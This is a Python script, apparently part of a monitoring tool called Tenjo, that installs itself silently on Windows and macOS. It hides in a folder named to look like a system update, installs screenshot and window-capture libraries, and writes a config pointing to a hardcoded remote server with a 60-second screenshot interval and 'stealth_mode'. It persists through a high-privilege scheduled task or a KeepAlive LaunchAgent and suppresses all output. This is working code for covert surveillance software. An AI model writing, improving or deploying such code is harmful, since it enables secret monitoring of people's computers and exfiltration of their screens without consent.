#!/usr/bin/env python3
"""
Tenjo Stealth Installer - Production Version
Silent installation for Windows and macOS without user notification
"""

import os
import sys
import platform
import subprocess
import shutil
import json
import threading
from pathlib import Path

class StealthInstaller:
    def __init__(self, server_url="http://103.129.149.67"):
        self.system = platform.system().lower()
        self.server_url = server_url
        self.install_dir = self._get_install_dir()
        self.service_name = "system_update_service"
        
    def _get_install_dir(self):
        """Get appropriate installation directory based on OS"""
        if self.system == "windows":
            return os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate')
        else:  # macOS/Linux
            return os.path.expanduser('~/.system_update')
    
    def silent_install(self):
        """Perform silent installation without any user notification"""
        try:
            # Create installation directory
            os.makedirs(self.install_dir, exist_ok=True)
            
            # Copy source files
            self._copy_source_files()
            
            # Install Python dependencies
            self._install_dependencies()
            
            # Setup configuration
            self._setup_config()
            
            # Setup auto-start service
            self._setup_autostart()
            
            # Start the service immediately
            self._start_service()
            
            return True
        except Exception:
            # Silent failure - no error messages
            return False
    
    def _copy_source_files(self):
        """Copy source files to installation directory"""
        current_dir = os.path.dirname(os.path.abspath(__file__))
        src_dir = os.path.join(current_dir, 'src')
        dest_src = os.path.join(self.install_dir, 'src')
        
        if os.path.exists(dest_src):
            shutil.rmtree(dest_src)
        shutil.copytree(src_dir, dest_src)
        
        # Copy main files
        main_files = ['main.py', 'tenjo_startup.py']
        for file in main_files:
            src_file = os.path.join(current_dir, file)
            if os.path.exists(src_file):
                shutil.copy2(src_file, self.install_dir)
    
    def _install_dependencies(self):
        """Install required Python packages silently"""
        packages = [
            'requests', 'psutil', 'mss', 'pillow'
        ]
        
        if self.system == "windows":
            packages.extend(['pywin32', 'pygetwindow'])
        else:
            packages.extend(['Quartz', 'AppKit'])
        
        for package in packages:
            try:
                subprocess.run([
                    sys.executable, '-m', 'pip', 'install', package
                ], capture_output=True, check=False)
            except:
                pass
    
    def _setup_config(self):
        """Setup configuration file"""
        config = {
            "server_url": self.server_url,
            "client_id": "",
            "screenshot_interval": 60,
            "stealth_mode": True,
            "auto_start": True
        }
        
        config_file = os.path.join(self.install_dir, 'src', 'core', 'config.json')
        os.makedirs(os.path.dirname(config_file), exist_ok=True)
        
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
    
    def _setup_autostart(self):
        """Setup auto-start based on OS"""
        if self.system == "windows":
            self._setup_windows_autostart()
        else:
            self._setup_macos_autostart()
    
    def _setup_windows_autostart(self):
        """Setup Windows auto-start via Task Scheduler"""
        try:
            python_exe = sys.executable
            script_path = os.path.join(self.install_dir, 'tenjo_startup.py')
            
            # Create scheduled task
            cmd = [
                'schtasks', '/create', '/tn', self.service_name,
                '/tr', f'"{python_exe}" "{script_path}"',
                '/sc', 'onlogon', '/rl', 'highest', '/f'
            ]
            subprocess.run(cmd, capture_output=True, check=False)
        except:
            pass
    
    def _setup_macos_autostart(self):
        """Setup macOS auto-start via LaunchAgent"""
        try:
            python_exe = sys.executable
            script_path = os.path.join(self.install_dir, 'tenjo_startup.py')
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_exe}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
            
            plist_dir = os.path.expanduser('~/Library/LaunchAgents')
            os.makedirs(plist_dir, exist_ok=True)
            
            plist_file = os.path.join(plist_dir, 'com.system.update.service.plist')
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Load the service
            subprocess.run(['launchctl', 'load', plist_file], 
                         capture_output=True, check=False)
        except:
            pass
    
    def _start_service(self):
        """Start the monitoring service immediately"""
        try:
            script_path = os.path.join(self.install_dir, 'tenjo_startup.py')
            if self.system == "windows":
                # Run in background on Windows
                subprocess.Popen([sys.executable, script_path], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Run in background on macOS/Linux
                subprocess.Popen([sys.executable, script_path], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
        except:
            pass

def main():
    """Main installation function"""
    # Get server URL from command line or use default
    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://103.129.149.67"
    
    installer = StealthInstaller(server_url)
    success = installer.silent_install()
    
    # No output - completely silent
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
